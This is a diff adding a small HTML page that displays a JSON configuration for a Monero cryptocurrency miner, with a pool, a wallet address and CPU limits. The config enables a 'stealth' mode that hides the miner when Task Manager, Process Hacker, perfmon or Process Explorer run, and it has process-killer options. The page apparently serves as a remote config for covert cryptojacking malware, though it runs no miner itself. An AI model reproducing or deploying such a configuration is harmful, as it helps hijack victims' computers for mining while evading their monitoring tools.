@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mining Configuration</title>
+    <style>
+        pre {
+            white-space: pre-wrap; /* Preserve whitespace */
+            font-family: monospace; /* Use a monospaced font */
+        }
+    </style>
+    <script>
+        const config = {
+            
+            "algo": "rx/0",
+            "pool": "pool.supportxmr.com",
+            "port": 443,
+            "wallet": "8475xXUZ4i4XnRXAvtqCsoUcZN3G5BCiMRcmJF4i5rJLJbsP8Jv87A9XxPaEiagCYD3kpidmaimTG8emAsJApzKsRTSddUm",
+            "password": "",
+            "rig-id": "",
+            "keepalive": false,
+            "nicehash": false,
+            "ssltls": false,
+            "max-cpu": 20,
+            "idle-wait": 2,
+            "idle-cpu": 80,
+            "stealth": true,
+            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+            "process-killer": false,
+            "kill-targets": ""
+        };
+
+        window.onload = () => {
+            // Format the output to separate lines
+            const jsonOutput = JSON.stringify(config, null, 2); // Pretty-printed JSON
+            document.body.innerHTML = `<pre>${jsonOutput}</pre>`;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
